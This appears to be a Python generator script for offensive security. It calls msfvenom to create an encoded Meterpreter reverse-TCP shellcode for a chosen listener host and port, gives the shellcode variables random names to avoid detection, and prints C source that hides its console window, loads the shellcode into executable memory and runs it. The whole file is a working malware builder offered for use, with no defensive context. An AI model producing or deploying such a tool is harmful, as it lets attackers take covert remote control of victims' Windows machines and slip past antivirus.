#!/usr/bin/env python3

import subprocess
import os
import sys
import random
import argparse 

parser = argparse.ArgumentParser(
	description="Generate a ready-to-compile, obfucsated,  Meterpreter Reverse TCP payload in C."
)

parser.add_argument('--lhost', metavar='127.0.0.1', type=str, required=True)
parser.add_argument('--lport', metavar='4444', type=int, required=True)

# Assign arguments
LHOST = parser.parse_args().lhost
LPORT = parser.parse_args().lport

key_space = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_'

subprocess.check_output(['/usr/bin/msfvenom', '-p', 'windows/meterpreter/reverse_tcp', f'LHOST={LHOST}', f'LPORT={LPORT}', '--encoder', 'x86/xor_dynamic', '-f', 'c', '-o', 'payload.tmp'], stderr=subprocess.DEVNULL)
f = open('payload.tmp', 'r')
payload = f.read()
f.close()
os.remove('payload.tmp')

payload_variable = ''.join(random.choice(key_space) for i in range(random.randrange(2,50)))
payload = payload.replace('buf', payload_variable)

exec_variable = ''.join(random.choice(key_space) for i in range(random.randrange(2,50)))

C_Code = f"""

#include "Windows.h"
int main(int argc, char* argv[]){{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    {payload}
    void* {exec_variable} = VirtualAlloc(0, sizeof {payload_variable}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy({exec_variable}, {payload_variable}, sizeof {payload_variable});
	((void(*)()){exec_variable})();
	return 0;
}}

"""
print(C_Code)